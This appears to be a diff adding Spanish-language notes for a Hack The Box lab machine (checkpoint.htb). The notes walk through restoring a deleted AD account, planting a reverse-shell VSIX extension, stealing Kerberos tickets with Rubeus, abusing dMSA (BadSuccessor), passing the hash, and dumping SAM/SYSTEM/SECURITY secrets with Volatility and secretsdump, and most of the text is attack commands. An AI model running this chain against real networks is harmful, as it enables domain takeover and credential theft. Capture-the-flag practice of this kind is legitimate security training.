@@ -1,0 +1,55 @@
+*- revivir a mark.davies
+
+   bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb \
+  set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
+
+*-  crear extension maliciosa
+  zip -r ../exploit.vsix "[Content_Types].xml" extension.vsixmanifest extension/
+  (o usa un py listo para esto)
+
+*- sube un VSIX malicioso con un revshell y esperala
+  rlwrap nc -lvnp 4444 -s $l
+
+**** Captura la UFLAG **** 
+
+*- con rubeus.exe genera un tgt para el usuario donde tienes la rev
+
+  .\rubeus.exe tgtdeleg /nowrap
+
+*- copia el base64 y hazlo ccache con impacket  
+  ticketConverter .kirbi .ccache
+
+*- usa bloodyAD para crear una dmsa maliciosa
+
+  export KRB5CCNAME=/tmp/ryan2.ccache
+  bloodyAD -k ccache=/tmp/ryan2.ccache \
+  -u ryan.brooks \
+  --dc-ip $TARGET_IP \
+  --host dc01.checkpoint.htb \
+  -d checkpoint.htb \
+  add badSuccessor evilDMSA6 \
+  -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
+  --ou "OU=DMSAHolder,DC=checkpoint,DC=htb"
+
+*- captura el token para la dmsa y ponlo en el KRB5CCNAME
+ export KRB5CCNAME=evilDMSA6_ty.ccache
+
+*- tambien guarda el token NTLM (RC4) ya que este es el mismo de svc_deploy (te muestra 2 usa cualquiera a ver cual pega)
+
+  nxc smb dc01.checkpoint.htb -u svc_deploy -H $SVC_HASH --shares
+
+*- utiliza smbclient con pass the hash para descargar el archivo compartido en el samba VMBackup
+
+*- busca y encuentra el snapshot.vmem para usar Volatility3 para dumpear los hive
+  vol -f snapshot.vmem \
+  -o lsass_dump \
+  windows.registry.hivelist.HiveList --dump
+
+*- Por ultimo utiliza impacket para dumpear los secretos de los hive
+  impacket-secretsdump \
+  -sam lsass_dump/registry.SAM.0xc30a3278e000.hive \
+  -system lsass_dump/registry.SYSTEM.0xc30a2fe38000.hive \
+  -security lsass_dump/registry.SECURITY.0xc30a32789000.hive \
+  LOCAL
+
+*- utiliza el hash obtenido para ganar la **** ROOT Flag ****
